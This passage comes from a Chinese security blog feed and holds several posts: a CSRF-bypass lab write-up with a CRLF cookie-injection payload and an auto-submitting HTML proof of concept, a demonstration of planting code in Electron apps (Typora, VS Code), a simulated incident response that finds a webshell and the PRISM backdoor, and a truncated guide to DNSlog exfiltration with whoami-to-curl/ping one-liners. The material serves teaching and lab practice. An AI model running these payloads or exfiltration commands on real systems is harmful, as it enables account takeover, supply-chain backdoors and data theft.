src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-11.png" class="" title="2024-02-05_21-11.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>很遗憾，看来这个点还是有用的，尝试修改请求方法，看看这里我们能不能用 get 请求来修改邮箱呢</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-17.png" class="" title="2024-02-05_21-17.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-17_1.png" class="" title="2024-02-05_21-17_1.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>说明修改请求方法是成功的，可以绕过，我们继续删除后面的csrf参数，处理逻辑有没有变化，删除后发现也是可以成功修改的，这就说明当我们的请求方式改变之后，这个csrf参数的校验就失效了，于是我们就可以制作poc生成恶意攻击链接，并诱导受害者点击</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-22.png" class="" title="2024-02-05_21-22.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-24.png" class="" title="2024-02-05_21-24.png"><h4 id="未校验参数是否存在"><a href="#未校验参数是否存在" class="headerlink" title="未校验参数是否存在"></a>未校验参数是否存在</h4><p>这种漏洞出现的原因就是没有校验参数的完整性。通过观察数据包，如果修改关键参数并且不做校验，直接制作poc生成恶意攻击链接即可，这里就不赘述了</p><h4 id="使用公共的CSRF-token池"><a href="#使用公共的CSRF-token池" class="headerlink" title="使用公共的CSRF token池"></a>使用公共的CSRF token池</h4><p>这种情况是由于这个应用没有将一个用户的 session 和他的 CSRF token 进行绑定，而是做了一个公共的CSRF token池，只要是这个池里的 token，都是有效的，绕过的思路那就是直接自己登录上去获取到一个 token 即可绕过</p><p>这一次需要两个账号 wiener 和 carlos 来进行演示<br>首先登陆 wiener 并观察数据包，请求包还是一样的，但是发现通过用上面的方式已经绕不过去了。这里我们先记录一下wiener的token值，然后登出 wiener 登录 carlos 在修改邮箱的时候替换 CSRF 的值,发现修改成功，成功绕过</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-47.png" class="" title="2024-02-05_21-47.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>这就说明，用户每次修改邮箱的时候需要一个服务器下发的一次性 CSRF token，但这个 token 并没有与 session 绑定，而是从公共token池中提取的，那么我们就可以通过自己的账号来获取一个有效的 CSRF token 来绕过这个校验机制，只不过每次有用户上钩之后我们需要刷新这个 token 值</p><h4 id="token-直接在-cookie-中获取"><a href="#token-直接在-cookie-中获取" class="headerlink" title="token 直接在 cookie 中获取"></a>token 直接在 cookie 中获取</h4><p>这种情况下想要利用还需要有 CRLF 漏洞来配合，或者有其他的可以注入 cookie 的漏洞，使得你可以控制 cookie 的数据进而控制 csrf token 的数据</p><p>这次可以看到应该是走了双层验证，那么我们就需要一个地方来想办法注入 set-cookie，通过测试这里的搜索框存在 CRLF 漏洞，payload：%0d%0aSet-Cookie:%20csrf&#x3D;123456%3b%20SameSite&#x3D;None</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-58.png" class="" title="2024-02-05_21-58.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-02.png" class="" title="2024-02-05_22-02.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>那么我们就可以在自己的上构造一个响应，让它去请求刚才存在CRLF漏洞上的资源，然后发起一个请求来实现 CRLF 注入，之后再发送请求去修改邮箱就可以，首先还是用burpsuite先生成一个csrf的poc,然后对其修改：利用 img 标签去请求 web-security-academy.net（存在CRLF漏洞的完整URL）上的一个不存在的图片，当它发送这个请求的时候， web-security-academy.net 的 cookie 中的 csrf 键将被设置为 csrf&#x3D;123456，当请求失败的时候，就会提交我们的 CSRF 代码来修改邮箱</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111<span class="hljs-symbol">&amp;#64;</span>normal<span class="hljs-symbol">&amp;#45;</span>user<span class="hljs-symbol">&amp;#46;</span>net&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=123456%3b%20SameSite=None&quot;</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit();&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-17.png" class="" title="2024-02-05_22-17.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-16.png" class="" title="2024-02-05_22-16.png"><h4 id="删除-referer-头"><a href="#删除-referer-头" class="headerlink" title="删除 referer 头"></a>删除 referer 头</h4><p>这次我们可以看到数据包中如果成功修改的话会自动跳转，同时请求包里有 referer 头，通常这种情况存在于开发人员在写代码的时候没有考虑到 referer 头不存在的情况下的处理逻辑，导致绕过了 referer 校验。但由于 referer 头是浏览器自动添加的请求头，所以通过上面的方式去要求 referer 头等于某个特定的值来绕过 referer 校验是不可行的，那我们看看把他改一下会是什么响应</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-28.png" class="" title="2024-02-05_22-28.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-29.png" class="" title="2024-02-05_22-29.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>这里报错是无效的 referer，那我们看看删了它会有什么响应</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-29_1.png" class="" title="2024-02-05_22-29_1.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>可以看到是成功的，那么下一步就是如何在 POC 里让它不发送 referer 头了，这就需要借助 meta 标签了（meta 标签用于提供关于 HTML 文档的元数据信息，也可以用来控制客户端发起请求的时候是否携带某个请求头），这里就是通过 meta 标签，来控制客户端发起请求不含 referer(no-referer)，payload如下</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-33.png" class="" title="2024-02-05_22-33.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-35.png" class="" title="2024-02-05_22-35.png"><h2 id="CSRF防范措施"><a href="#CSRF防范措施" class="headerlink" title="CSRF防范措施"></a>CSRF防范措施</h2><p>1、验证 HTTP Referer 字段<br>2、在请求地址中添加 token 并验证<br>3、在 HTTP 头中自定义属性并验证<br>4、浏览器端启用 SameSite cookie</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Electron投毒攻击的研究</title>
    <link href="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <url>/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是Electron？"><a href="#什么是Electron？" class="headerlink" title="什么是Electron？"></a>什么是Electron？</h2><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。通过Node它提供了通常浏览器所不能提供的能力。一个基础的Electron包含三个文件：package.json（元数据）、main.js（代码）和index.html（图形用户界面）。框架由Electron可执行文件（Windows中为electron.exe、macOS中为electron.app、Linux中为electron）提供。开发者可以自行添加标志、自定义图标、重命名或编辑Electron可执行文件</p><p>Electron的优点：<br>兼容性：虽然你还在用WEB技术进行开发，但是你不用再考虑兼容性问题了，你只需要关心你当前使用Electron的版本对应Chrome的版本，一般情况下它已经足够新来让你使用最新的API和语法了，你还可以手动升级Chrome版本。同样的，你也不用考虑不同浏览器带的样式和代码兼容问题</p><p>NodeJS环境：这可能是很多前端开发者曾经梦想过的功能，在WEB界面中使用Node.js提供的强大API，这意味着你在WEB页面直接可以操作文件，调用系统API，甚至操作数据库。当然，除了完整的 Node API，你还可以使用额外的几十万个npm模块</p><p>跨域：你可以直接使用Node提供的request模块进行网络请求，这意味着你无需再被跨域所困扰</p><p>强大的扩展性：借助node-ffi，为应用程序提供强大的扩展性</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/Electron_20.0.3_screenshot.png" class="" title="Electron_20.0.3_screenshot.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>现在市面上已经有非常多的应用在使用Electron进行开发了，包括我们熟悉的VS Code客户端、GitHub客户端、Atom客户端等等</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/20230620170908414.png" class="" title="20230620170908414.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>参考文章：<br><a href="https://zhuanlan.zhihu.com/p/69109695">https://zhuanlan.zhihu.com/p/69109695</a><br><a href="https://zh.wikipedia.org/wiki/Electron#">https://zh.wikipedia.org/wiki/Electron#</a></p><h2 id="Electron投毒原理"><a href="#Electron投毒原理" class="headerlink" title="Electron投毒原理"></a>Electron投毒原理</h2><p>Electron通常是通过ASAR进行打包以及分发应用程序的。因为ASAR可以将与应用程序相关的所有文件以及目录单独打包成一个独立的文件，也就是.asar文件（通常在resources文件夹下面），所以它最大的优势在与可以在多平台运行。而Electron投毒则是通过对ASAR文件进行解包之后在源代码以及依赖中植入恶意代码，或者调试模式注入代码，从而实现恶意命令执行、植入后门木马等行为，而且Electron通常带有可信的数字签名，所以植入的恶意代码不会破坏签名校验</p><h2 id="攻击常用手法"><a href="#攻击常用手法" class="headerlink" title="攻击常用手法"></a>攻击常用手法</h2><h3 id="node-modules投毒"><a href="#node-modules投毒" class="headerlink" title="node_modules投毒"></a>node_modules投毒</h3><p>通过对Electron应用程序中的node_modules依赖项中植入恶意代码，应用程序运行时会被加载并执行恶意操作，接下来我以typora为例，typora为例是一款非常好用的markdown编辑器</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-18.png" class="" title="2024-02-04_10-18.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-17.png" class="" title="2024-02-04_10-17.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>typora安装目录下的resources文件夹有一个node_modules.asar，对它进行解包</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-19.png" class="" title="2024-02-04_10-19.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-29.png" class="" title="2024-02-04_10-29.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>然后在raven库中植入恶意代码，因为这个库会在打开typora时会被加载，这里我们通过触发计算器来模拟演示执行恶意代码的效果</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-39_1.png" class="" title="2024-02-04_10-39_1.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>保存后通过ASAR再打包回去<br>asar pack .&#x2F;node_modules_extract node_modules.asar<br>当我们重启typora的时候发现执行了恶意代码</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-42.png" class="" title="2024-02-04_10-42.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><h3 id="入口文件投毒"><a href="#入口文件投毒" class="headerlink" title="入口文件投毒"></a>入口文件投毒</h3><p>攻击者可以在应用的入口文件（如main.js等）中注入恶意代码，当应用程序启动时，这些代码会被执行。下面我以程序员常用的代码编辑器vscode来演示，找到vscode的应用配置文件package.json，通过查看main字段，发现入口文件为out目录下面的main</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-59.png" class="" title="2024-02-04_10-59.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>随后我们找到out目录下面的main,并植入恶意代码，保存完同样用ASAR再打包回去，重启vscode可以发现触发了恶意代码</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_11-03.png" class="" title="2024-02-04_11-03.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_11-05.png" class="" title="2024-02-04_11-05.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><h3 id="调试模式注入"><a href="#调试模式注入" class="headerlink" title="调试模式注入"></a>调试模式注入</h3><p>通过chrome的inspect功能实现在调试模式下注入恶意代码,可以直接参考开源项目：<a href="https://github.com/djerryz/electron_shell">https://github.com/djerryz/electron_shell</a></p>]]></content>
    
    
    <categories>
      
      <category>瞎搞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次应急响应的模拟复盘</title>
    <link href="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>某公司WebServer服务器遭到攻击者入侵，现疑似该服务器的应用系统被上传恶意软件或后门，很多重要文件被破坏，现启动网络安全事件应急响应，入手接管该服务器，发现攻击者放置的恶意软件或后门，分析还原攻击者如何入侵进服务器</p><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><p>拿到服务器发现开放着80端口，是具有web端的，于是初步猜测，攻击者从web端入的手，拿到webshell,从而进一步攻击控制的服务器，于是看一下web日志，发现了apache文件夹，可以断定网页用的apache</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-20.png" class="" title="2024-02-03_16-20.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>查看apache日志文件夹，里面有多个日志文件，进行逐一查看，因为数据太大不方便查看与整理，我用本机进行ssh连接，将日志文件复刻下来，通过编辑器查看更方便些。</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-21.png" class="" title="2024-02-03_16-21.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>下载下来之后，开始进行日志分析，因为数据量太大、信息量太大，需要花很大的耐心，终于在184行发现了dirsearch攻击工具的痕迹，并且一直持续到9000多行，可以判断攻击者进行了目录扫描，并且攻击IP都指向了192.168.1.7（模拟环境）,因此我们得到了攻击者的IP</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-28.png" class="" title="2024-02-03_16-28.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-31.png" class="" title="2024-02-03_16-31.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>既然得到了攻击IP，通过定位IP得到了攻击者的ua头，攻击者用的Linux x86_64系统</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-29.png" class="" title="2024-02-03_16-29.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>略过大量的目录扫描日志数据，接着往下分析，在9203行附近发现路径参数里有个1.php文件，并且后面做了id , whoami , bash反弹shell的行为，这里可以判断攻击者进行了传马、命令执行、拿webshell的行为，重点是响应均为200,说明攻击成功，也就是说24&#x2F;Apr&#x2F;2022:15:26:42 这个时间打进来的</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-33.png" class="" title="2024-02-03_16-33.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-57.png" class="" title="2024-02-03_16-57.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>为了进一步验证，根据日志里路径，去apache目录里面找一下1.php文件是否存在，确认存在，cat一下，果然是一个典型的一句话木马，密码2022,所以前面的分析也得到了证实</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-34.png" class="" title="2024-02-03_16-34.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>将网站打包下载下来借助D盾扫一下，发现了隐藏木马footer.php</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-22.png" class="" title="2024-02-03_16-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>随后查看进程，发现有一个prism的进程，我的第一意识是ICMP反弹后门，为了得到进一步确认，通过进程的pid号追踪文件位置，发现在root目录下面并且还在隐藏文件夹内，并且通过查看文件属性，是一个elf可执行文件，就更可疑了</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-38.png" class="" title="2024-02-03_16-38.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-40.png" class="" title="2024-02-03_16-40.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_20-43.png" class="" title="2024-02-03_20-43.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>其实看到这里，心里八九不离十已经有答案了，为了得知真相，我们将这个elf可执行文件复刻一份到本机，进行样本逆向分析，果然在main函数里看到了key和路径，这也证实了是ICMP的反弹后门：prism</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-53.png" class="" title="2024-02-03_16-53.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-54.png" class="" title="2024-02-03_16-54.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>PRISM只有两个主文件，配置简单，能在Linux、Solaris、AIX、BSD&#x2F;Mac、Android等多个系统上运行，支持两种工作模式：ICMP 和 STATIC 模式<br>ICMP模式：<br>使用这种模式的后门将会在后台等待特定的包含主机&#x2F;端口连接信息的ICMP数据包，通过私有密钥可以阻止第三方访问。后门进程接受ping包激活<br>STATIC模式：<br>使用这种模式，后门主机将会主动尝试连接到指定端口的的IP地址上，所以只要在指定IP上监听指定端口等待连接就可以了。但是，缺点很明显，很任意暴露攻击者的IP地址，而且使用不够灵活。但是话说回来，两种工作模式、运行时进程重命名、不会监听端口、自动清除iptables规则表、采用C语言编写（代码仅有200来行），所以不需要任何库支持，所以prism作为一款迷你级的后门木马，还是很受欢迎的<br>正当我准备结束的时候，忽然在日志中发现了shodan 的痕迹，应该是攻击者资产收集所使用的平台</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-55.png" class="" title="2024-02-03_16-55.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>关机…</p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行无回显下的数据外带</title>
    <link href="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/"/>
    <url>/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>在注入时, 存在盲注或者延时, 我们获得需要数据就会频繁请求, 最后导致IP 被Ban,还有就是当我们进行命令执行的时候，目标站点什么也不显示,无法确定,所以用DNSlog外带可以减少请求并且直接回显数据<br>dnslog 数据外带通常用在以下情景：</p><p>1.SQL盲注<br>2.无回显的XSS<br>3.无回显的命令执行<br>5.无回显的SSRF<br>5.Blind XXE</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将需要查询的值和域名拼接起来，向域名发送请求，便会传递到自己这里，然后通过读日志获取信息。为了方便理解，我自己模糊的做了一个原理图</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_10-36.png" class="" title="2024-02-03_10-36.png"><h2 id="Windows中的利用方式"><a href="#Windows中的利用方式" class="headerlink" title="Windows中的利用方式"></a>Windows中的利用方式</h2><h3 id="for-ping"><a href="#for-ping" class="headerlink" title="for + ping"></a>for + ping</h3><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do ping %i.xxx.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-40.png" class="" title="2024-02-03_09-40.png"><h3 id="for-curl"><a href="#for-curl" class="headerlink" title="for + curl"></a>for + curl</h3><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do curl <a href="http://192.168.43.190:8000/%i">http://192.168.43.190:8000/%i</a></p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-42.png" class="" title="2024-02-03_09-42.png"><h3 id="用户名变量"><a href="#用户名变量" class="headerlink" title="%用户名变量%"></a>%用户名变量%</h3><p>直接通过%用户变量%来获取信息</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-56.png" class="" title="2024-02-03_09-56.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-51.png" class="" title="2024-02-03_09-51.png"><h2 id="Linux中的利用方式"><a href="#Linux中的利用方式" class="headerlink" title="Linux中的利用方式"></a>Linux中的利用方式</h2><h3 id="反引号-ping"><a href="#反引号-ping" class="headerlink" title="反引号 + ping"></a>反引号 + ping</h3><p>命令示例：ping <code>whoami</code>.foxd5a.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-20.png" class="" title="2024-02-03_09-20.png"><h3 id="ping"><a href="#ping" class="headerlink" title="$() + ping"></a>$() + ping</h3><p>命令示例：ping $(whoami).dyy8n3.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-23.png" class="" title="2024-02-03_09-23.png"><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>命令示例：curl <a 